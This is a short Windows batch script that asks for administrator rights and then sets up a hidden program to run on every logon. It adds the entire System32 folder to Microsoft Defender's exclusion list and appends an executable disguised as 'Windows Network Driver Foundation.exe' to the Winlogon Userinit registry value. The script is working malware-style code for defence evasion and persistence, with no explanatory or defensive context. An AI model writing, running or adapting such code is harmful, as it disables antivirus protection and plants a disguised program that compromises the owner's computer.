@echo off
>nul 2>&1 "%SYSTEMROOT%\System32\cacls.exe" "%SYSTEMROOT%\System32\config\system"
if %errorlevel% neq 0 (
    echo Requesting admin privileges...
    powershell -command Start-Process "%0" -Verb RunAs
    exit /b
)


powershell -Command "Add-MpPreference -ExclusionPath '%SystemRoot%\System32\'"

set "newExecutable=%SystemRoot%\System32\Windows Network Driver Foundation.exe"

for /f "tokens=2*" %%A in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit ^| find "Userinit"') do (
    set "currentUserinit=%%B"
)

set "combinedUserinit=%currentUserinit%%newExecutable%,"

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "%combinedUserinit%" /f

